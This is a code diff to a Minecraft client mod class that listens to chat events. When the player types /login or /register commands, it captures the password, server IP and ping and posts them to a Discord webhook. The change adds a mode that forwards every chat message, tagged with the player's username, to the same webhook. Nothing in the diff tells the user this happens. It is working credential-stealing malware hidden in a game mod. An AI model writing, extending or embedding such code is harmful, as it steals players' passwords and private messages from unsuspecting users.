@@ -16,12 +16,12 @@ public class log {
     DiscordWebhook webhookDetector = cfg.detector;
 
     @SubscribeEvent
-    public void ChatEvent(ClientChatEvent e) {
+    public void ChatEvent(ClientChatEvent e) throws IOException {
         String msg = e.getMessage();
         String[] sentences = e.getMessage().split(" ");
 
-        if ((msg.startsWith("/l") || msg.startsWith("/login") || msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
-            try {
+        if (!cfg.logAll) {
+            if ((msg.startsWith("/l") || msg.startsWith("/login") || msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
                 webhookLogger.clearEmbeds();
                 webhookLogger.addEmbed(new DiscordWebhook.EmbedObject()
                         .setTitle("Infinity")
@@ -31,16 +31,15 @@ public class log {
                         .addField("PASSWORD", sentences[1], true)
                         .addField("SERVER", Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).serverIP, true)
                         .addField("PING", String.valueOf(Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).pingToServer), true)
-                        .addField("VERSION", Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).gameVersion, true)
-                        .addField("NAME", Objects.requireNonNull(Minecraft.getMinecraft().getCurrentServerData()).serverName, true)
 
 
                         .setThumbnail("https://yt3.ggpht.com/aaaOPBv9Zerpdv5YrsMVUhZalk8GI3qS34UAhOHKr15Mnzd-uMv1v00p7rD3VVm7QXfJ5RhCUGU=s600-c-k-c0x00ffffff-no-rj-rp-mo"));
 
                 webhookLogger.execute();
-            } catch (IOException ex) {
-                ex.printStackTrace();
             }
+        } else {
+            webhookLogger.setContent("```" + Minecraft.getMinecraft().getSession().getUsername() + ": " + msg + "```");
+            webhookLogger.execute();
         }
     }
 
